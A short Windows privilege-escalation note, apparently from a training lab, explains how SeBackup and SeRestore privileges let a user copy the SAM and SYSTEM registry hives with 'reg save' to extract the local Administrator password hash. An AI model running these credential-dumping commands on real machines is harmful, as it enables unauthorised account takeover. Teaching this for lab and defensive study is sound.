The SeBackup and SeRestore privileges ***allow users to read and write to any file, bypassing the DACL restrictions***. These privileges are ***intended for users who need to perform backups without full administrative access***. However, an attacker with these privileges can escalate their access by copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

**Check Privileges**
```
whoami /priv
```
- `SeBackupPrivilege`
- `SeRestorePrivilege`

**Backup the SAM and SYSTEM Hashes**
```
# SYSTEM
reg save hklm\system C:\Users\THMBackup\system.hive

# SAM
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

